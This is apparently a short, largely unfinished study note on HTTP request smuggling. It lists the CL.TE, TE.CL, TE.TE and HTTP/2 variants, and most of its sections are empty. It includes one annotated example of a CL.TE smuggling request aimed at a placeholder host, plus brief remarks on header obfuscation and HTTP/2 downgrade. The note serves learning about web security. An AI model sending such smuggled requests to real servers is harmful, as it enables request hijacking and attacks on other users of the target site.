# HTTP Request Smuggling

## Types:

1. HTTP/1.1
    1. CL.TE
    2. TE.CL
    3. TE.TE
3. HTTP/2

## How to find each type:

1. HTTP/1.1
    1. CL.TE
    2. TE.CL
    3. TE.TE

## How to exploit each type:

1. HTTP/1.1
    1. CL.TE
       ```http
       POST / HTTP/1.1
       Host: vulnerable-website.com
       Content-Length: 13               --> Content length is 13 which includes smuggled
       Transfer-Encoding: chunked    

       0                               --> Since it is chunked the 0 terminates the first request, sending smuggled to the backend

       SMUGGLED               
       ```
    3. TE.CL
    4. TE.TE

## Other important notes:
- HTTP/1.1 allows for content-length transfer-encoding
- Some servers that do support the Transfer-Encoding header can be induced not to process it if the header is obfuscated in some way.
- HTTP/2 is only vulnerable if the backend supports HTTP/1.1
- You need to manually switch the protocol in repeater
